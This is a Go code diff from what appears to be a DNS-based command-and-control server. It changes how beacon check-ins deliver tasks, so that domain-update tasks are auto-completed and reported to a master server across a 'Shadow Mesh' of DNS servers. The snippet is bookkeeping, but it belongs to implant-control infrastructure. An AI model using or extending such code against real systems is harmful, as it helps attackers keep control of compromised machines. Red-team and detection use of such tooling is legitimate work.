@@ -1063,31 +1063,64 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 		beacon.TaskQueue = beacon.TaskQueue[1:] // Remove from queue
 		beacon.CurrentTask = task.ID            // Mark as current task
 
-		// Mark task as sent
+		// Check if this is a domain update task (D-prefix)
+		// These are fire-and-forget tasks that don't expect a result
+		isDomainUpdate := strings.HasPrefix(task.ID, "D")
+
+		// Mark task as sent (or completed for domain updates)
 		if storedTask, exists := c2.tasks[task.ID]; exists {
-			storedTask.Status = "sent"
-			now := time.Now()
-			storedTask.SentAt = &now
+			if isDomainUpdate {
+				// Domain update tasks are auto-completed on delivery
+				// The client doesn't send a result for these (see Client/main.go:435)
+				storedTask.Status = "completed"
+				now := time.Now()
+				storedTask.SentAt = &now
+				storedTask.Result = "domains_updated" // Implicit result
+				beacon.CurrentTask = ""               // Clear immediately - no result expected
+
+				if c2.debug {
+					logf("[DEBUG] Auto-completed domain update task %s for beacon %s (fire-and-forget)", task.ID, beaconID)
+				}
+			} else {
+				// Regular task - mark as sent, wait for result
+				storedTask.Status = "sent"
+				now := time.Now()
+				storedTask.SentAt = &now
+			}
 		}
 		c2.mutex.Unlock()
 
 		// CRITICAL: Notify Master that THIS DNS server delivered the task
 		// This prevents other DNS servers from delivering it (Shadow Mesh coordination)
 		if masterClient != nil {
-			go func(tid string) {
-				if err := masterClient.MarkTaskDelivered(tid); err != nil && c2.debug {
-					logf("[C2] Warning: Failed to notify Master of task delivery: %v", err)
+			go func(tid string, completed bool) {
+				if completed {
+					// For domain updates, submit an implicit result to Master
+					// This marks the task as completed in the Master database
+					_, err := masterClient.SubmitResult(tid, beaconID, 1, 1, "domains_updated")
+					if err != nil && c2.debug {
+						logf("[C2] Warning: Failed to submit domain update completion to Master: %v", err)
+					}
+				} else {
+					// For regular tasks, just notify delivery
+					if err := masterClient.MarkTaskDelivered(tid); err != nil && c2.debug {
+						logf("[C2] Warning: Failed to notify Master of task delivery: %v", err)
+					}
 				}
-			}(task.ID)
+			}(task.ID, isDomainUpdate)
 		}
 
 		// Update task status in local database (async, outside lock)
 		if c2.db != nil {
-			go func(tid string) {
-				if err := c2.db.UpdateTaskStatus(tid, "sent"); err != nil && c2.debug {
+			go func(tid string, completed bool) {
+				status := "sent"
+				if completed {
+					status = "completed"
+				}
+				if err := c2.db.UpdateTaskStatus(tid, status); err != nil && c2.debug {
 					logf("[C2] Failed to update task status in database: %v", err)
 				}
-			}(task.ID)
+			}(task.ID, isDomainUpdate)
 		}
 
 		taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
